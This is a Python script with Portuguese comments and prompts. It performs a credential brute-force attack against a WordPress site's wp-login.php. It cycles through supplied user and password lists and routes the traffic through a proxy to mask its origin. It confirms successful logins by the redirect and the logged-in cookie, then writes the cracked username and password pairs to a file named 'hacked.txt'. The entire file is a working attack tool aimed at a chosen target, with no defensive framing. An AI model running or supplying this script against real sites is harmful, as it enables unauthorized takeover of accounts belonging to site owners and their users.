# Bruteforce em mais de um usuário via WP-LOGIN com PROXIES!

import requests
import os
import colorama
import time
import datetime
import socks

sistema = os.name
if sistema == "nt":
	os.system('cls')
else:
	os.system('clear')

proxy = str(input("Digite seu proxy(somente https,http ou socks5): "))
alvo = str(input("Digite seu alvo >> ").strip())
arquivo_usuarios = str(input("Informe o endereço do arquivo txt que contém os usuarios: ").strip())
arquivo_senhas = str(input("Informe o endereço do arquivo txt que contém as senhas: ").strip())
arquivousuarios = os.path.isfile(arquivo_usuarios)
arquivosenhas = os.path.isfile(arquivo_senhas)
while(arquivousuarios == 0):
	arquivo_usuarios = str(input("[X] Informe o endereço CORRETO do arquivo txt que contém os usuarios: ").strip())
	arquivousuarios = os.path.isfile(arquivo_usuarios)
while(arquivosenhas == 0):
	arquivo_senhas = str(input("[X] Informe o endereço CORRETO do arquivo txt que contém as senhas: ").strip())
	arquivosenhas = os.path.isfile(arquivo_senhas)
usuarios = open(arquivo_usuarios,'r')
usuarios_lista = usuarios.read().split('\n')
senhas = open(arquivo_senhas,'r')
senhas_lista = senhas.read().split('\n')
print(">> Iniciando ataque de força bruta em todos usuarios da lista em {} !\n".format(alvo))
cortempo = (colorama.Fore.CYAN)
cortentativa = (colorama.Fore.RED)
for senha in senhas_lista:
	 	for usuario in usuarios_lista:
	 		site = ("{}/wp-login.php".format(alvo))
	 		postdata = ('log={}&pwd={}&testcookie=1&redirect_to={}/wp-admin/&wp-submit=1'.format(usuario, senha, alvo))
	 		wpcookies = {
	 		'wordpress_test_cookie': 'WP+Cookie+check'
	 		}
	 		headers = {
	 		'Content-Type': 'application/x-www-form-urlencoded'
	 		}

	 		proxies = {
	 		'http': '{}'.format(proxy),
	 		'https': '{}'.format(proxy)
	 		}
	 		r = requests.post(url=site,data=postdata,timeout=40,cookies=wpcookies,headers=headers,proxies=proxies,allow_redirects=False)
	 		resposta = str(r.status_code)
	 		tempoatual = (datetime.datetime.now().time())
	 		tempo = str(tempoatual)
	 		tempo = (tempo[0:8])
	 		if(resposta == '200'):
	 			print("{}[{}]{} - {}:{} - Failed :(".format(cortempo,tempo,cortentativa,usuario,senha))
	 		elif(resposta == "302"):
	 			c = str(r.headers)
	 			print("{}[{}]{} - {}:{} - SUCESSO! Confirmando...".format(cortempo,tempo,cortentativa,usuario,senha))
	 			time.sleep(2)
	 			if("/wp-admin/'" and 'wordpress_logged_in_' in c):
	 				print("{}[{}]{} - {}:{} -  CONFIRMADO B).".format(cortempo,tempo,cortentativa,usuario,senha))
	 				f = open("hacked.txt","a")
	 				f.write("{}:{} ==> {}\n".format(usuario,senha,site))
	 				f.close()
	 				continuar = str(input("Deseja continuar o bruteforce em outros usuários?[1=SIM|2=NAO]: "))
	 				if(continuar == "1"):
	 					print("Removendo '{}' da lista e testando novos usuários...".format(usuario))
	 					usuarios_lista.remove('{}'.format(usuario))
	 					time.sleep(3)
	 					print("Usuário {} removido !".format(usuario))
	 				elif(continuar == "2"):
	 					print("Bye, =).")
	 					exit()
	 			else:
	 				print("{}[{}]{} - {}:{} - FALSO POSITIVO :(.".format(cortempo,tempo,cortentativa,usuario,senha))
	 		elif(resposta == "404"):
	 			print("Área de login não encontrada no path informado da aplicação, verifique se informou o path correto da aplicação web rodando wp, ou pode ser que seu alvo esteja com filtro de ip ou outro tipo de proteçao.")
	 			exit()
	 		elif(resposta == "403"):
	 			print("Código http 403 retornado, possíveis wafs &/ou filtros...")
print(colorama.Style.RESET_ALL)
